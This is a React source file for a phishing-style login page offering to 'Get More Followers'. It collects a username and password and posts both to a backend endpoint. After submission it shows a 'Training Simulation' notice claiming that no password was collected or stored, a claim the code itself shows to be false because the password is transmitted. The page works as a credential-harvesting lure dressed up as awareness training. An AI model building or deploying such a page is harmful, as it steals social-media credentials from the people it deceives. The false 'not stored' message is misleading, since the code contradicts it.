import { useState } from "react";
import axios from "axios";

export default function App() {
  const [submitted, setSubmitted] = useState(false);
  const [formData, setformData] = useState(null);

  const API_URL = import.meta.env.VITE_API_URL;

  const setDataAPI = async (data) => {
    try {
      const res = await axios.post(`${API_URL}/api/set-data`, data);
      console.log("Data saved successfully:", res.data);
      return res.data;
    } catch (error) {
      console.error("API Error:", error.response?.data || error.message);
      throw error;
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      await setDataAPI(formData);
      setSubmitted(true);
    } catch (error) {
      setSubmitted(false);
    }
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setformData({ ...formData, [name]: value });
  };

  return (
    <div className="min-h-screen bg-[#0b0b0f] flex items-center justify-center px-4 text-white">
      <div className="w-full max-w-[380px]">
        {/* Login Card */}
        <div className="bg-[#111116] border border-[#29292f] rounded-xl px-8 py-10 shadow-2xl">
          {/* Brand */}
          <div className="text-center mb-8">
            <h1 className="text-2xl font-bold tracking-tight text-white">
              Get More Followers
            </h1>

            <p className="text-sm text-gray-500 mt-3">
              Share moments. Connect with people.
            </p>
          </div>

          {!submitted ? (
            <form onSubmit={handleSubmit} className="space-y-3">
              <input
                onChange={handleChange}
                name="username"
                type="text"
                placeholder="username"
                className="w-full h-11 px-3 text-sm
                bg-[#1b1b21] border border-[#303038]
                text-white placeholder:text-gray-500
                rounded-md outline-none
                focus:border-gray-500
                focus:ring-1 focus:ring-gray-600"
              />

              <input
                onChange={handleChange}
                name="password"
                type="password"
                placeholder="Password"
                className="w-full h-11 px-3 text-sm
                bg-[#1b1b21] border border-[#303038]
                text-white placeholder:text-gray-500
                rounded-md outline-none
                focus:border-gray-500
                focus:ring-1 focus:ring-gray-600"
              />

              <button
                type="submit"
                className="w-full h-10 mt-2 rounded-md
                bg-blue-600 hover:bg-blue-700
                text-white text-sm font-semibold
                transition"
              >
                Log in
              </button>
            </form>
          ) : (
            <div className="text-center py-5">
              <div
                className="mx-auto mb-4 w-12 h-12 rounded-full
                bg-green-500/10 flex items-center justify-center"
              >
                <span className="text-green-500 text-xl">✓</span>
              </div>

              <h2 className="text-lg font-semibold text-white">
                Training Simulation
              </h2>

              <p className="text-sm text-gray-500 mt-2 leading-6">
                This was a cybersecurity awareness exercise. No password was
                collected or stored.
              </p>
            </div>
          )}

          {!submitted && (
            <>
              {/* Divider */}
              <div className="flex items-center gap-3 my-6">
                <div className="h-px bg-[#29292f] flex-1" />

                <span className="text-xs text-gray-600 font-medium">OR</span>

                <div className="h-px bg-[#29292f] flex-1" />
              </div>

              {/* Social Login */}
              <button
                type="button"
                className="w-full text-sm font-semibold
                text-gray-300 hover:text-white transition"
              >
                Continue with Social Account
              </button>

              {/* Forgot */}
              <button
                type="button"
                className="block mx-auto mt-6
                text-xs text-blue-500 hover:text-blue-400"
              >
                Forgot password?
              </button>
            </>
          )}
        </div>

        {/* Signup */}
        {!submitted && (
          <div
            className="bg-[#111116] border border-[#29292f]
            rounded-xl mt-4 py-5 text-center"
          >
            <p className="text-sm text-gray-400">
              Don't have an account?{" "}
              <button className="font-semibold text-blue-500 hover:text-blue-400">
                Sign up
              </button>
            </p>
          </div>
        )}

        {/* Training Notice */}
        <p className="text-[11px] text-gray-600 text-center mt-5 leading-5">
          Cybersecurity training interface • Fictional service
        </p>
      </div>
    </div>
  );
}
